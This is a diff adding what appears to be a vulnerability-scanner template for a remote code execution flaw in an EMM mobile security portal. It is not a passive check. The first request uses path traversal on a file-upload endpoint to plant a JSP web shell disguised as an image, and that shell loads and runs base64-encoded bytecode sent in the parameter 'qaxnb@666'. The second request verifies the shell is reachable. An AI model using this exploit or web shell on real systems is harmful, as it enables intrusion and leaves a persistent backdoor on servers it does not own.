@@ -1,0 +1,63 @@
+id: EMM-rce
+#fofa:"EMM移动安全门户"
+info:
+  name: EMM RCE
+  author: ritikchaddha
+  severity: critical
+  reference:
+    - https://github.com/momika233
+
+requests:
+  - raw:
+      - |
+        POST /emm-api/app/uploadAppFile.do?FileName=3.jsp&uidmobiledevid=%2f&strpackagename=../../../../../../../..//home/appiron/JianqView/tomcat-service/webapps/emm-api//&FilePath=mm HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        Content-Type: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu1RlcGqmfNT6jUBW
+
+        ------WebKitFormBoundaryu1RlcGqmfNT6jUBW
+        Content-Disposition: form-data; name="upFile"; filename="momika233.jsp"
+        Content-Type: image/jpeg
+
+        <%!
+            class U extends ClassLoader {
+                U(ClassLoader c) {
+                    super(c);
+                }
+                public Class g(byte[] b) {
+                    return super.defineClass(b, 0, b.length);
+                }
+            }
+         
+            public byte[] base64Decode(String str) throws Exception {
+                try {
+                    Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                    return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+                } catch (Exception e) {
+                    Class clazz = Class.forName("java.util.Base64");
+                    Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                    return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+                }
+            }
+        %>
+        <%
+            String cls = request.getParameter("qaxnb@666");
+            if (cls != null) {
+                new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+            }
+        %>
+        ------WebKitFormBoundaryu1RlcGqmfNT6jUBW--
+      - |
+
+        GET /emm-api/momika233.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    req-condition: true
+    matchers:
+
+      - type: dsl
+        dsl:
+        - 'status_code_1 == 200'
+        - 'status_code_2 == 200'
+
